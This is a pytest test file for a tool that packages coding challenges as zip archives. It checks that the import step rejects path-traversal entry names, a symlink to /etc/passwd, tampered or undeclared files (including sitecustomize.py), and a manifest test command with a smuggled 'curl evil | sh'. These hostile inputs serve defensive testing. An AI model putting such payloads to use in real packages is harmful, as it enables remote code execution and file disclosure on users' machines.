from __future__ import annotations

import json
import stat
import zipfile
from pathlib import Path

import pytest

from repoboss.agents import BUILTIN
from repoboss.challenge import ChallengeError, create_challenges, verify_challenge
from repoboss.packaging import PackageError, export_challenge, import_challenge
from repoboss.run import RunError, run_challenge
from repoboss.runners import LocalRunner
from repoboss.workspace import Workspace


@pytest.fixture
def package(demo_repo: Path, ws: Workspace, runner: LocalRunner, tmp_path: Path) -> Path:
    _, results = create_challenges(ws, demo_repo, runner, transforms=["path_reference"], seed=0)
    cid = results[0].challenge_id
    assert cid is not None
    res = export_challenge(ws, cid, tmp_path / "pkg.zip")
    assert "manifest.json" in res.included and "snapshot/tests/test_pricing.py" in res.included
    return res.path


@pytest.fixture
def other_ws(tmp_path: Path) -> Workspace:
    return Workspace.init(tmp_path / "other", runner="local")[0]


def rewrite(src: Path, dst: Path, *, mutate=None, extra: list[tuple[zipfile.ZipInfo | str, bytes]] = ()) -> Path:
    with zipfile.ZipFile(src) as zin, zipfile.ZipFile(dst, "w") as zout:
        for info in zin.infolist():
            data = zin.read(info.filename)
            if mutate:
                data = mutate(info.filename, data)
            zout.writestr(info.filename, data)
        for name, data in extra:
            zout.writestr(name, data)
    return dst


def test_manifest_is_versioned_with_hashes(package: Path) -> None:
    with zipfile.ZipFile(package) as zf:
        manifest = json.loads(zf.read("manifest.json"))
    assert manifest["format"] == "repoboss-challenge" and manifest["format_version"] == 1
    assert all(len(f["sha256"]) == 64 for f in manifest["files"])
    assert manifest["challenge"]["seed"] == 0 and manifest["challenge"]["config"]["test"]


def test_roundtrip_requires_explicit_trust(package: Path, other_ws: Workspace) -> None:
    res = import_challenge(other_ws, package)
    row = other_ws.get_challenge(res.challenge_id)
    assert row is not None and row["status"] == "imported_unverified" and not row["trusted"]
    runner = LocalRunner(other_ws.envs_dir)
    with pytest.raises(RunError):
        run_challenge(other_ws, res.challenge_id, BUILTIN["demo-oracle"], runner)
    with pytest.raises(ChallengeError, match="--trust"):
        verify_challenge(other_ws, res.challenge_id, runner)
    assert not any(other_ws.envs_dir.iterdir())  # nothing was prepared or executed
    v = verify_challenge(other_ws, res.challenge_id, runner, trust=True)
    assert v.status == "accepted"
    assert run_challenge(other_ws, res.challenge_id, BUILTIN["demo-oracle"], runner)[0].outcome == "passed"


@pytest.mark.parametrize(
    "bad_name", ["../evil.py", "snapshot/../../evil.py", "/abs.py", "C:/x.py", "snapshot\\..\\evil.py"]
)
def test_path_traversal_is_rejected(package: Path, other_ws: Workspace, tmp_path: Path, bad_name: str) -> None:
    bad = rewrite(package, tmp_path / "bad.zip", extra=[(bad_name, b"print('pwned')")])
    with pytest.raises(PackageError):
        import_challenge(other_ws, bad)
    assert not (tmp_path / "evil.py").exists()
    assert other_ws.list_challenges() == []


def test_symlink_entry_is_rejected(package: Path, other_ws: Workspace, tmp_path: Path) -> None:
    info = zipfile.ZipInfo("snapshot/link")
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    bad = rewrite(package, tmp_path / "link.zip", extra=[(info, b"/etc/passwd")])
    with pytest.raises(PackageError, match="symbolic link"):
        import_challenge(other_ws, bad)


def test_tampered_file_is_rejected(package: Path, other_ws: Workspace, tmp_path: Path) -> None:
    def mutate(name: str, data: bytes) -> bytes:
        return data + b"\nimport os\n" if name == "snapshot/src/shopcalc/pricing.py" else data

    with pytest.raises(PackageError, match="hash mismatch"):
        import_challenge(other_ws, rewrite(package, tmp_path / "t.zip", mutate=mutate))


def test_undeclared_file_is_rejected(package: Path, other_ws: Workspace, tmp_path: Path) -> None:
    bad = rewrite(package, tmp_path / "x.zip", extra=[("snapshot/sitecustomize.py", b"import os")])
    with pytest.raises(PackageError, match="not declared"):
        import_challenge(other_ws, bad)


def test_unsupported_version_is_rejected(package: Path, other_ws: Workspace, tmp_path: Path) -> None:
    def mutate(name: str, data: bytes) -> bytes:
        if name != "manifest.json":
            return data
        manifest = json.loads(data)
        manifest["format_version"] = 99
        return json.dumps(manifest).encode()

    with pytest.raises(PackageError, match="format_version"):
        import_challenge(other_ws, rewrite(package, tmp_path / "v.zip", mutate=mutate))


def test_shell_string_commands_in_manifest_are_rejected(package: Path, other_ws: Workspace, tmp_path: Path) -> None:
    def mutate(name: str, data: bytes) -> bytes:
        if name != "manifest.json":
            return data
        manifest = json.loads(data)
        manifest["challenge"]["config"]["test"] = "pytest && curl evil | sh"
        return json.dumps(manifest).encode()

    with pytest.raises(PackageError, match="invalid challenge metadata"):
        import_challenge(other_ws, rewrite(package, tmp_path / "s.zip", mutate=mutate))


def test_not_a_zip(other_ws: Workspace, tmp_path: Path) -> None:
    junk = tmp_path / "junk.zip"
    junk.write_bytes(b"not a zip")
    with pytest.raises(PackageError):
        import_challenge(other_ws, junk)
